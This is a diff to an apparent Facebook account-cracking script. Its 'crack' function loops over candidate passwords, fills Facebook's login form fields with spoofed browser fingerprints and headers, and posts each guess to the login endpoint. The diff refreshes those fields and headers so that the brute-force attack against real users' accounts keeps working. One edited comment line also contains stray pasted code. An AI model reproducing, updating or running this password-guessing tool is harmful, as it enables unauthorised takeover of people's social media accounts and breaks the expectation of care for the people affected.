@@ -145,7 +145,7 @@ def crack(uid, password_list, total_count):
             sys.stdout.write(f"\r{color}CRACKING {progress} \033[1;92m{success_count}\033[1;97m:\033[1;91m{fail_count} \033[1;93m{percentage:.1f}%")
             sys.stdout.flush()
             
-            # Create session and generate device hash
+            # Create session and generate device hash    re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),   "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}
             Session = requests.Session()
             facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
             bv = f"{random.randint(1111111,7777777)}"
@@ -171,51 +171,45 @@ def crack(uid, password_list, total_count):
             "viewport-width": "980"}
             requu1 = Session.get(url1,headers=head)
             log_data = {
-            'email': uid,
-            'cuid': 'AYg-Zk3oBYS1IvkNsDBz-LJWCgiozUvirKReZ1dxv4ymdNH3-gkKiiEuQ3_Rpg2-uoR7dwTRnmUx9szEXe_sejzDUnWbSwZwAuHZk3vAOeLkUW_b-pZaVzxEfnOd8x6lbr-fj70m99RHpZ6fC6rmgYN1e_QBicJQHFf1syDbJj7I6fAxI9NAVX3N3s1Wl4txmUyFCGnqZ85kbHXGeJLvDbcbpXcjPc4TC4itvKF1DUZiMVg00N_n-VYTcff5UAZ9mCg',
-            'guid': 'ffcc6be62735888e9',
-            'lgnjs': '1765922875',
-            'lgnrnd': '140753__cXd',
-            'locale': 'en_GB',
-            'login_source': 'comet_login_header',
-            'next': 'https://www.facebook.com/logiy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzY1OTIyODUwLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%253D%253D&next',
-            'skstamp': '',
-            'timezone': '-330',
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
             'jazoest': re.search('name="jazoest" value="(.*?)"',str(requu1.text)).group(1),
-            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
-            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AZMZAAAAAFAA',
-            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc2NTkyMjg3Ni4xODgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp7InciOjExMDUsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzY1OTIyODc2LjIzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzY1OTIyODc2LjE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzY1OTIyODc2LjIwNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3NjU5MjI4NzYuMjA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc2NTkyMjg3Ni4yMDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjV9XSwiMzAxMDYiOlt7InQiOjE3NjU5MjI4NzYuMTg0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ZmFsc2V9LHsidCI6MTc2NTkyMjg3Ni4yMjgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzY1OTIyODc2LjE4NSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOmZhbHNlfV19',
+            'lsd': re.search('name="lsd" value="(.*?)"',str(requu1.text)).group(1),
+            'display': '',
+            'isprivate': '',
+            'return_session': '',
+            'skip_api_login': '',
+            'signed_next': '',
+            'trynum': '3',
+            'timezone': '15',
+            'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjozMn0=',
+            'lgnrnd': '085407_pTYu',
+            'lgnjs': '1769944455',
+            'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2OTk0NDQ1NS44MDksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6ZmFsc2V9XSwiMzAwMDEiOlt7InQiOjE3Njk5NDQ0NTUuODEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6NX1dLCIzMDAwMiI6W3sidCI6MTc2OTk0NDQ1NS44MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoyfV0sIjMwMDAzIjpbeyJ0IjoxNzY5OTQ0NDU1LjgxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOlsiZW4tSU4iLCJlbi1VUyIsImVuLUdCIiwiZW4iLCJoaSIsImd1IiwiYm4iXX1dLCIzMDAwNCI6W3sidCI6MTc2OTk0NDQ1NS44MSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoxMDB9XSwiMzAwMDUiOlt7InQiOjE3Njk5NDQ0NTUuODEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6eyJ3IjoxNDQwLCJoIjo3NzN9fV0sIjMwMDA3IjpbeyJ0IjoxNzY5OTQ0NDU1LjgxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJkZWZhdWx0In1dLCIzMDAwOCI6W3sidCI6MTc2OTk0NDQ1NS44NDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6InByb21wdCJ9XSwiMzAwMTIiOlt7InQiOjE3Njk5NDQ0NTUuODExLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3Njk5NDQ0NTUuODExLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0NS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc2OTk0NDQ1NS44MTEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IldpbjMyIn1dLCIzMDAxOCI6W3sidCI6MTc2OTk0NDQ1NS44MTEsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc2OTk0NDQ1NS44MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzY5OTQ0NDU1LjgyLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3Njk5NDQ0NTUuODIsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6MH1dLCIzMDA5NCI6W3sidCI6MTc2OTk0NDQ1NS44MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0NS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc2OTk0NDQ1NS44MiwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijo1fV0sIjMwMTA2IjpbeyJ0IjoxNzY5OTQ0NDU1Ljc5MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzY5OTQ0NDYyLjY5NywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzY5OTQ0NDU1Ljc5MywiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX1dfQ==',
+            'email': uid,
+            'prefill_contact_point': uid,
+            'prefill_source': 'browser_dropdown',
+            'prefill_type': 'password',
+            'first_prefill_source': 'browser_dropdown',
+            'first_prefill_type': 'contact_point',
+            'had_cp_prefilled': 'true',
+            'had_password_prefilled': 'true',
+            'ab_test_data': '/fAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAVVVAAA/BAAJ',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(int(time.time()), pw),}
-            url = "https://web.facebook.com/login/device-based/regular/login/?login_attempt=1"
-            headers = {"authority": "web.facebook.com",
-            "method": "POST",
-            "path": "/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios&lwv=100",
-            "scheme": "https",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "accept-encoding": "gzip, deflate, br",
-            "accept-language": "en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
-            "cache-control": "max-age=0",
-            "content-type": "application/x-www-form-urlencoded",
-            "dpr": "3",
-            "origin": "https://web.facebook.com",
-            "referer": "https://web.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1MTM2NjI2LCJjYWxsc2l0ZV9pZCI6MjM5NDQ2MTI0MDg0ODgxN30%3D&next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fios",
-            "sec-ch-prefers-color-scheme": "light",
-            "sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-            "sec-ch-ua-full-version-list": "\"Not-A.Brand\";v=\"99.0.0.0\", \"Chromium\";v=\"124.0.6327.4\"",
-            "sec-ch-ua-mobile": "?0",
-            "sec-ch-ua-model": "\"\"",
-            "sec-ch-ua-platform": "\"Linux\"",
-            "sec-ch-ua-platform-version": "\"\"",
-            "sec-fetch-dest": "document",
-            "sec-fetch-mode": "navigate",
-           "sec-fetch-site": "same-origin",
-           "sec-fetch-user": "?1",
-           "upgrade-insecure-requests": "1",
-           "user-agent": us,
-           "viewport-width": "980"}           
+            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348092"
+            headers = {
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://www.facebook.com',
+            'Referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
+            'Upgrade-Insecure-Requests': '1',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36',
+            'dpr': '1',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
+            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Google Chrome";v="145.0.7632.5", "Chromium";v="145.0.7632.5"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'viewport-width': '1089',}          
             respon = Session.post(url,data=log_data,headers=headers,allow_redirects=False)
             log_cookies = Session.cookies.get_dict().keys()
             # Check response
